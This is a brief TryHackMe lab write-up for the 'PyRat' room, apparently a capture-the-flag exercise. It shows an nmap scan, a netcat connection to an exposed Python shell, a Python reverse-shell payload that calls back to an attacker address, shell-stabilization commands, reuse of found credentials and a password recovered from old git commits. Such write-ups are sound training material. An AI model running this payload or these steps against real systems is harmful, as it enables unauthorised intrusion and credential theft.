# TryHackMe - PyRat 

> Room: [https://tryhackme.com/room/pyrat](https://tryhackme.com/room/pyrat)  
> Category: Easy | Focus: Python reverse engineering, file inclusion, privilege escalation
----
## Nmap Scan  
Discovered ports 22 (SSH) and 8000 (Python web server)  
`nmap -sC -sV -oA pyrat 10.10.11.169`

---

## Initial Access  
Connected to port 8000 using netcat  
`nc 10.10.11.169 8000`  
Got interactive Python shell

---

## Reverse Shell Payload  
Used this payload to get a reverse shell:  
```python
import socket,subprocess,os  
s=socket.socket();s.connect(("10.9.X.X",4444))  
os.dup2(s.fileno(),0)  
os.dup2(s.fileno(),1)  
os.dup2(s.fileno(),2)  
subprocess.call(["/bin/bash"])
```
## For shell stabilization
I used: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
Then, `stty raw -echo; fg`
Looked around and saw a github credentials, logged in via ssh with those creds and boom!

## Priv Esc Meth2 
Found .git folder in /opt/dev
Recovered old commit with hidden /admin endpoint
Found password: _TH1NKINGPirate$_
Fuzzed endpoint, final password was abc123
Got root access again via admin interface

